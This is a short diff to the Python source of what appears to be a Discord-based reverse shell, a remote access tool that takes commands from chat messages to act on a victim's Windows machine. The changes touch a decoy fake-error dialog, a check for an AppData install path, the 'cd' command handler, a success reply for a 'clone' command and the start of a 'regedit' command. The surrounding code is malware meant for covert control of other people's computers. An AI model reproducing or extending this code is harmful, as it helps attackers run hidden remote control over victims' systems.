@@ -74,7 +74,7 @@ if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\Micr
 
 #def error():
 #    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
-    
+#    
 #if ERROR:
 #    error_t = threading.Thread(target=error).start()
 
@@ -316,7 +316,7 @@ async def on_message(message):
 #! CD
     elif message.content.startswith("cd"):
         directory = message.content[3:] #.split(" ")[1]
-        if directory == "root": 
+        if directory == "//root": 
             os.chdir(os.path.dirname(sys.argv[0]))
             embed = discord.Embed(title="Changed Directory to ROOT", description=f"```{os.getcwd()}```", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
@@ -634,6 +634,9 @@ async def on_message(message):
             os.chdir(os.path.dirname(sys.argv[0]))
             return
         os.chdir(os.path.dirname(sys.argv[0]))
+        embed = discord.Embed(title="Clone", description=f"```Successfully cloned to: {path}```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+        await message.reply(embed=embed)
     
 #! REGEDIT
     elif message.content.startswith("regedit "):
